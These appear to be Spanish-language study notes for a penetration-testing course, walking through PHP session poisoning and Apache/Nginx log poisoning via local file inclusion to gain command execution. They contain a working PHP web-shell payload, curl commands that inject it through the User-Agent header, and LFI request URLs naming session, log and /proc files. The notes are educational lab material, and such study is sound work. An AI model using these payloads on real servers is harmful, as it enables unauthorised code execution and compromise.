
## 🎯 Concepto

El **Log Poisoning** consiste en introducir código PHP en un archivo que registra información controlada por nosotros y, posteriormente, incluir ese archivo mediante una vulnerabilidad **LFI** para ejecutar el código.

### Requisitos

- Existencia de una vulnerabilidad LFI.
    
- Permisos de lectura sobre el archivo de log o sesión.
    
- Posibilidad de introducir contenido controlado por nosotros en dicho archivo.
    
- Una función vulnerable con privilegios de ejecución, como `include()` o `require()`.
    

**Flujo del ataque:**

1. Identificar un archivo de sesión o log accesible mediante LFI.
    
2. Encontrar un parámetro o una cabecera HTTP que podamos controlar.
    
3. Introducir código PHP en ese campo.
    
4. Incluir el archivo contaminado mediante LFI.
    
5. Si el código se interpreta como PHP, conseguir ejecución de comandos (RCE).
    

---

## 1. 🍪 PHP Session Poisoning

Las aplicaciones PHP suelen utilizar la cookie `PHPSESSID` para identificar la sesión del usuario. Los datos de la sesión se almacenan en archivos del servidor.

### Ubicaciones habituales

|Sistema|Directorio|
|---|---|
|Linux|`/var/lib/php/sessions/`|
|Windows|`C:\Windows\Temp\`|

El archivo de sesión utiliza el prefijo `sess_` seguido del valor de la cookie `PHPSESSID`.

**Ejemplo:**

```
PHPSESSID=nhhv8i0o6ua4g88bkdl9u1fdsd

/var/lib/php/sessions/sess_nhhv8i0o6ua4g88bkdl9u1fdsd
```

> ⚠️ Utiliza siempre el valor real de tu propia cookie. El identificador de sesión cambia entre sesiones.

### Paso 1. Leer el archivo de sesión mediante LFI

```
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_<PHPSESSID>
```

Busca datos que puedas controlar desde la aplicación.

Por ejemplo, el archivo puede contener:

```
page|s:6:"es.php";
preference|s:4:"es";
```

Si el parámetro `language` controla el valor `page`, podemos intentar modificarlo.

### Paso 2. Comprobar si controlamos el contenido

```
http://<SERVER_IP>:<PORT>/index.php?language=session_poisoning
```

Vuelve a incluir el archivo de sesión:

```
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_<PHPSESSID>
```

Si aparece `session_poisoning` en el archivo, hemos confirmado que podemos modificar ese dato.

### Paso 3. Envenenar la sesión

En el laboratorio, el objetivo es introducir código PHP en el parámetro controlado:

```
<?php system($_GET["cmd"]); ?>
```

Petición con el contenido codificado para una URL:

```
http://<SERVER_IP>:<PORT>/index.php?language=%3C%3Fphp%20system%28%24_GET%5B%22cmd%22%5D%29%3B%3F%3E
```

### Paso 4. Incluir la sesión y ejecutar un comando

```
http://<SERVER_IP>:<PORT>/index.php?language=/var/lib/php/sessions/sess_<PHPSESSID>&cmd=id
```

Si el código se interpreta correctamente, el comando `id` se ejecutará en el servidor.

### ⚠️ Consideración importante

El archivo de sesión puede sobrescribirse cuando vuelvas a utilizar la aplicación. Si sucede, tendrás que volver a envenenarlo.

En un laboratorio autorizado, el objetivo podría ser aprovechar esa ejecución para obtener una shell o demostrar el impacto de la vulnerabilidad.

## 2. 📝 Apache y Nginx Log Poisoning

Los servidores web registran información de las peticiones HTTP en archivos de log.

Entre los datos registrados puede encontrarse la cabecera `User-Agent`, cuyo valor podemos controlar desde el cliente.

Si podemos escribir código PHP en esa cabecera y después incluir el log mediante LFI, podemos conseguir ejecución de código.

### Ubicaciones habituales de los logs

|Servidor|Linux|Windows|
|---|---|---|
|Apache|`/var/log/apache2/`|`C:\xampp\apache\logs\`|
|Nginx|`/var/log/nginx/`|`C:\nginx\log\`|

El archivo que suele interesar inicialmente es `access.log`.

### Diferencias de permisos

- **Nginx:** sus logs suelen ser legibles por usuarios con pocos privilegios, como `www-data`.
    
- **Apache:** sus logs pueden requerir privilegios más elevados, por ejemplo, pertenecer al grupo `adm` o tener acceso de `root`.
    

Los permisos reales dependen de la configuración del servidor.

### Paso 1. Comprobar si podemos leer el log

Ejemplo para Apache:

```
http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log
```

Si funciona, podremos ver información registrada de las peticiones HTTP, que puede incluir:

- Dirección IP del cliente.
    
- Recurso solicitado.
    
- Código de respuesta.
    
- Cabecera `User-Agent`.
    

### Paso 2. Confirmar que controlamos el User-Agent

Podemos utilizar Burp Suite para interceptar una petición HTTP y modificar su cabecera:

```
User-Agent: Apache Log Poisoning
```

Después, al incluir el archivo `access.log` mediante LFI, podemos comprobar si aparece el valor que hemos enviado.

Esto confirma que el servidor registra el contenido controlado por nosotros.

### Paso 3. Envenenar el log

En el laboratorio, la cabecera puede contener código PHP como el siguiente:

```
<?php system($_GET['cmd']); ?>
```

También podemos enviar una petición con cURL, guardando la cabecera en un archivo:

```
echo -n "User-Agent: <?php system(\$_GET['cmd']); ?>" > Poison
```

Enviar la petición:

```
curl -s "http://<SERVER_IP>:<PORT>/index.php" -H @Poison
```

El servidor debería registrar la cabecera en su log de acceso.

### Paso 4. Incluir el log mediante LFI

Una vez registrado el contenido, volvemos a incluir el archivo:

```
http://<SERVER_IP>:<PORT>/index.php?language=/var/log/apache2/access.log&cmd=id
```

Si el archivo es legible y el código PHP se interpreta durante la inclusión, el comando `id` se ejecutará.

**El mismo principio puede aplicarse a los logs de Nginx**, siempre que tengamos los permisos necesarios.

### ⚠️ Precaución

Los logs pueden ser muy grandes. Incluirlos mediante LFI puede provocar respuestas lentas o afectar al servidor. En un laboratorio, utiliza únicamente las peticiones necesarias.

## 3. 🔍 Alternativa: archivos de `/proc/`

Si no podemos leer los logs del servidor, podemos comprobar si otros archivos accesibles contienen datos controlados por nosotros.

Dos rutas mencionadas en el módulo son:

```
/proc/self/environ
/proc/self/fd/N
```

Donde `N` representa un descriptor de archivo.

La cabecera `User-Agent` puede aparecer en información de procesos de Linux. Si el archivo contiene datos controlados por nosotros y es legible, podría permitir una técnica similar.

**Importante:** el acceso depende de los permisos y de la configuración del sistema; estas rutas no garantizan que el ataque funcione.

## 4. 📋 Otros logs que podemos investigar

Si tenemos acceso de lectura mediante LFI, podemos comprobar otros archivos de registro:

```
/var/log/sshd.log
/var/log/mail
/var/log/vsftpd.log
```

La técnica consiste en buscar un dato registrado que podamos controlar.

Ejemplos descritos en el módulo:

- **SSH:** intentar introducir un nombre de usuario controlado en un registro de autenticación.
    
- **FTP:** comprobar si el nombre de usuario enviado al servicio aparece en un log accesible.
    
- **Correo:** comprobar si el contenido de un mensaje aparece en un archivo de registro legible.
    

Si el log registra el contenido y podemos incluirlo mediante LFI, el código podría ejecutarse al interpretarse como PHP.

Estas ubicaciones son ejemplos: el nombre y la localización reales de los logs dependen del servicio y de la configuración.

## 5. 🧠 Chuleta para el examen

|Técnica|Dato controlado|Archivo que se incluye|
|---|---|---|
|PHP Session Poisoning|Parámetro almacenado en la sesión|`/var/lib/php/sessions/sess_<PHPSESSID>`|
|Apache Log Poisoning|Cabecera `User-Agent`|`/var/log/apache2/access.log`|
|Nginx Log Poisoning|Cabecera `User-Agent`|`/var/log/nginx/access.log`|
|`/proc/`|Información del proceso, si es controlable|`/proc/self/environ`|
|Otros logs|Usuario, mensaje u otro campo registrado|Depende del servicio|

### Metodología

1. **Identificar la LFI:** comprobar qué parámetro permite incluir archivos.
    
2. **Buscar archivos legibles:** sesiones, logs del servidor y otros logs del sistema.
    
3. **Identificar entradas controlables:** parámetros de la aplicación, cabeceras HTTP o datos enviados a otros servicios.
    
4. **Confirmar el envenenamiento:** incluir el archivo y comprobar que el dato aparece.
    
5. **Probar la ejecución:** en el laboratorio, verificar si PHP interpreta el contenido.
    
6. **Evaluar el impacto:** determinar qué puede hacer el proceso web con sus permisos.
    

### Diferencias clave

- **LFI:** permite incluir archivos locales.
    
- **Log Poisoning:** introduce contenido controlado en un archivo de registro y lo aprovecha mediante LFI.
    
- **Session Poisoning:** utiliza el mismo principio, pero el archivo contaminado es el de la sesión PHP.
    
- **RCE:** se consigue cuando el código introducido se ejecuta en el servidor.
    

> **Idea fundamental:** no basta con poder escribir en un log o una sesión. También necesitamos poder leer e incluir ese archivo mediante la vulnerabilidad y conseguir que el contenido introducido se interprete como código PHP.
